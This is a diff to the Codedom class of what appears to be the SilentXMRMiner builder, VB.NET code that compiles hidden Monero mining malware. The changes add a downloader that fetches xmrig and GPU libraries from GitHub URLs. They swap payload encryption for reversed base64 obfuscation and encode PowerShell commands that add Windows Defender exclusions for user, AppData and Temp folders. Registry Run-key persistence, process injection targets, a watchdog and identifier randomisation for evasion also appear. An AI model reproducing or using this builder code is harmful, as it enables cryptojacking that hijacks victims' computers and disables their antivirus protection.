@@ -17,7 +17,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:x64 "
+        Dim OP As String = " /target:library /platform:x64 /optimize "
 
         With Parameters
             .GenerateExecutable = False
@@ -28,6 +28,7 @@ Public Class Codedom
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
             .ReferencedAssemblies.Add("System.dll")
+            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.dll")
             .ReferencedAssemblies.Add("System.IO.Compression.FileSystem.dll")
@@ -36,12 +37,14 @@ Public Class Codedom
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
                 R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Mandark))
-                R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
+                If Not F.FA.toggleDownloader.Checked Then
+                    R.AddResource(F.Resources_xmrig, F.AES_Encryptor(My.Resources.xmrig))
+                End If
                 R.AddResource(F.Resources_winring, F.AES_Encryptor(My.Resources.WinRing0x64))
                 If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                     R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
                 End If
-                If (F.toggleEnableGPU.Checked) Then
+                If F.toggleEnableGPU.Checked And Not F.FA.toggleDownloader.Checked Then
                     R.AddResource(F.Resources_libs, F.AES_Encryptor(My.Resources.libs))
                 End If
                 R.Generate()
@@ -57,7 +60,7 @@ Public Class Codedom
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, minerbuilder.ToString())
             If Results.Errors.Count > 0 Then
                 For Each E In Results.Errors
-                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
+                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
                 MinerOK = False
             Else
@@ -76,7 +79,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:library /platform:x64 "
+        Dim OP As String = " /target:library /platform:x64 /optimize "
 
         With Parameters
             .GenerateExecutable = False
@@ -87,6 +90,7 @@ Public Class Codedom
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
             .ReferencedAssemblies.Add("System.dll")
+            .ReferencedAssemblies.Add("System.Core.dll")
             .ReferencedAssemblies.Add("System.Management.dll")
 
             Dim watchdogbuilder As New StringBuilder(Code)
@@ -98,7 +102,7 @@ Public Class Codedom
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, watchdogbuilder.ToString())
             If Results.Errors.Count > 0 Then
                 For Each E In Results.Errors
-                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
+                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
                 WatchdogOK = False
             Else
@@ -115,7 +119,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:x64 "
+        Dim OP As String = " /target:winexe /platform:x64 /optimize "
 
         If RequireAdministrator Then
             File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
@@ -134,6 +138,7 @@ Public Class Codedom
             .CompilerOptions = OP
             .IncludeDebugInformation = False
             .ReferencedAssemblies.Add("System.dll")
+            .ReferencedAssemblies.Add("System.Core.dll")
             If F.FA.toggleEnableDebug.Checked Then
                 .ReferencedAssemblies.Add("System.Windows.Forms.dll")
             End If
@@ -145,7 +150,7 @@ Public Class Codedom
             Dim Resources_Loader = F.Randomi(rand.Next(5, 40))
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Resources_Loader + ".Resources")
-                R.AddResource(Resources_Program, F.AES_Encryptor(ProgramBytes))
+                R.AddResource(Resources_Program, Encoding.ASCII.GetBytes(Convert.ToBase64String(ProgramBytes.Reverse().ToArray())))
                 R.Generate()
             End Using
 
@@ -162,7 +167,7 @@ Public Class Codedom
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, loaderbuilder.ToString())
             If Results.Errors.Count > 0 Then
                 For Each E In Results.Errors
-                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
+                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
                 LoaderOK = False
             Else
@@ -183,7 +188,7 @@ Public Class Codedom
         providerOptions.Add("CompilerVersion", "v4.0")
         Dim CodeProvider As New CSharpCodeProvider(providerOptions)
         Dim Parameters As New CompilerParameters
-        Dim OP As String = " /target:winexe /platform:x64 "
+        Dim OP As String = " /target:winexe /platform:x64 /optimize "
 
         If F.FA.toggleAdministrator.Checked Then
             File.WriteAllBytes(SavePath & ".manifest", My.Resources.administrator)
@@ -212,7 +217,7 @@ Public Class Codedom
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, uninstallerbuilder.ToString())
             If Results.Errors.Count > 0 Then
                 For Each E In Results.Errors
-                    MsgBox(E.ErrorText, MsgBoxStyle.Critical)
+                    MsgBox("Line: " & E.Line & " Column: " & E.Column & " Error message: " & E.ErrorText, MsgBoxStyle.Critical)
                 Next
                 UninstallerOK = False
             Else
@@ -228,11 +233,15 @@ Public Class Codedom
     Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
         If F.FA.toggleKillWD.Checked Then
             stringb.Replace("DefKillWD", "true")
-            stringb.Replace("#KillWDCommands", F.EncryptString("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & exit"))
+            stringb.Replace("#KillWDCommands", Convert.ToBase64String(Encoding.ASCII.GetBytes("powershell -Command Add-MpPreference -ExclusionPath '%cd%' & powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%' & powershell -Command Add-MpPreference -ExclusionPath '%AppData%' & powershell -Command Add-MpPreference -ExclusionPath '%Temp%' & exit").Reverse().ToArray()))
         End If
 
         If F.FA.toggleEnableDebug.Checked Then
             stringb.Replace("DefDebug", "true")
+        End If
+
+        If F.FA.toggleDownloader.Checked Then
+            stringb.Replace("DefDownloader", "true")
         End If
 
         If F.toggleEnableGPU.Checked Then
@@ -275,19 +284,21 @@ Public Class Codedom
             stringb.Replace("%v2%", F.num_Assembly2.Text)
             stringb.Replace("%v3%", F.num_Assembly3.Text)
             stringb.Replace("%v4%", F.num_Assembly4.Text)
-            stringb.Replace("%Guid%", Guid.NewGuid.ToString)
         End If
+
+        stringb.Replace("%Guid%", Guid.NewGuid.ToString)
 
         stringb.Replace("#STARTDELAY", F.txtStartDelay.Text)
         stringb.Replace("#KEY", F.AESKEY)
         stringb.Replace("#SALT", F.SALT)
         stringb.Replace("#IV", F.IV)
-        stringb.Replace("#CLKEY", F.EncryptString("UXUUXUUXUUCommandULineUUXUUXUUXU"))
-        stringb.Replace("#CLIV", F.EncryptString("UUCommandULineUU"))
         stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#DLLSTR", F.EncryptString("Mandark.Mandark"))
         stringb.Replace("#DLLOAD", F.EncryptString("Load"))
         stringb.Replace("#REGKEY", F.EncryptString("Software\Microsoft\Windows\CurrentVersion\Run\"))
+        stringb.Replace("#LIBSURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/libs.zip"))
+        stringb.Replace("#MINERURL", F.EncryptString("https://github.com/UnamSanctam/SilentXMRMiner/raw/master/SilentXMRMiner/Resources/xmrig.zip"))
+        stringb.Replace("#LIBSPATH", F.EncryptString("Microsoft\Libs\"))
         stringb.Replace("#InjectionTarget", F.EncryptString(F.InjectionTarget(0)))
         stringb.Replace("#InjectionDir", F.InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", """ + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + """))
 
@@ -299,8 +310,7 @@ Public Class Codedom
         stringb.Replace("RCheckProc", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RInitialize", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RGetGPU", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RAES_Encryptor", F.Randomi(F.rand.Next(5, 40)))
-        stringb.Replace("RAES_Decryptor", F.Randomi(F.rand.Next(5, 40)))
+        stringb.Replace("RAES_Method", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RTruncate", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RCommandLineEncrypt", F.Randomi(F.rand.Next(5, 40)))
         stringb.Replace("RWDLoop", F.Randomi(F.rand.Next(5, 40)))
